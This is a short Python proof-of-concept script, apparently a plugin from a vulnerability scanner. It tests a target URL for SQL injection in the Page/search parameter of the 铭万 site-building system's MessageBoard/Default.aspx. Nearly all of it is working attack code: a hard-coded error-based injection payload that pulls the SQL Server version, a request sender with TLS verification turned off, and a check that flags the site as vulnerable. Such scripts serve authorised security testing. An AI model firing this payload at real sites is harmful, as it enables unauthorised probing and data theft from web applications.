#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 铭万事业通用建站系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-074974
author: Lucifer
description: /MessageBoard/Default.aspx文件Page参数存在SQL注入漏洞,获取敏感数据。
'''
import sys
import requests
import warnings
from termcolor import cprint

class mainone_b2b_Default_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/MessageBoard/Default.aspx?hidIsreply=DefaultModule1%24rbIsReply&DefaultModule1%24txtKey=%%27AnD%2B(SeLeCt%20ChAr(64)%2B@@VerSion)>0%20AnD%2B%27%%27=%27"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 500 and r"@Microsoft" in req.text:
                cprint("[+]存在铭万事业通用建站系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = mainone_b2b_Default_sqli_BaseVerify(sys.argv[1])
    testVuln.run()